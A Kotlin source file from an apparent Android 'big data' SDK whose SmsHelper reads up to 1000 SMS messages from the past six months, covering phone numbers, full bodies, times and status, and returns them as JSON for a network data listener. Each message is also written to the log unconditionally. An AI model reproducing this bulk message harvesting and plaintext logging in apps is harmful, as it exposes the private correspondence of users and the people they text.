package com.bigdata.lib

import android.Manifest
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import com.bigdata.lib.net.BigDataNetBaseParamsManager
import com.google.gson.JsonArray
import com.google.gson.JsonObject
import com.util.lib.log.isDebug
import com.util.lib.log.logger_e
import com.util.lib.log.logger_i

/**
 * Created by weishl on 2020/12/31
 *
 */
object SmsHelper {

    private const val TAG = "debug_SmsHelper"
    private const val MAX_ITEM = 1000//短信抓取最大条数
    /**
     * 获取短信信息
     */
    @JvmStatic
    fun getMessage(): JsonArray {
        val jsonArray = JsonArray()
        val manager =  BigDataManager.get().getNetDataListener()
        if (manager!=null){
            if (BigDataNetBaseParamsManager.isPermissionAuth(Manifest.permission.READ_SMS) == 0){
                logger_i(TAG, " getMessage = 没有权限")
                return JsonArray()
            }

            var cursor: Cursor? = null
            try {
                val resolver = manager.getContext().contentResolver
                val uri = Uri.parse("content://sms/")
                cursor = resolver.query(
                    uri,
                    arrayOf(
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.READ,
                        Telephony.Sms.STATUS,
                        Telephony.Sms.TYPE
                    ),
                    "date>?",
                    arrayOf(MCLCManager.getLast_6_Month_time().toString()),
                    "date DESC limit $MAX_ITEM"
                )
                if (cursor != null) {
                    var jsonObject: JsonObject
                    while (cursor.moveToNext()) {
                        jsonObject = JsonObject()
                        jsonObject.addProperty(
                            "addr",
                            BigDataNetBaseParamsManager.formatPhone(cursor.getString(0).orEmpty())
                        )//如果是已发出信息就是收件人手机号 如果是收到的信息就是发件人的手机号
                        jsonObject.addProperty("body", cursor.getString(1))//短信具体内容
                        //日期，long型 收到短信的时间
                        jsonObject.addProperty(
                            "time", if (cursor.getLong(2) == null) {
                                0
                            } else {
                                cursor.getLong(2) / 1000
                            }
                        )
                        //是否阅读0未读，1已读
                        jsonObject.addProperty("read", cursor.getString(3))
                        //短信状态-1 接收，0 complete,64 pending,128 failed
                        jsonObject.addProperty("status", cursor.getString(4))
                        //短信类型1是接收到的，2是已发出
                        jsonObject.addProperty("type", cursor.getString(5))
                        jsonArray.add(jsonObject)
                        logger_i(TAG, " getmessage object = $jsonObject")
                    }
                    if (isDebug()) {
                        logger_i(TAG, " getmessage = $jsonArray")
                    }
                }
            } catch (e: Exception) {
                logger_e(TAG, " getmessage e = $e")
            }finally {
                close(cursor)
            }

        }
        return jsonArray
    }
}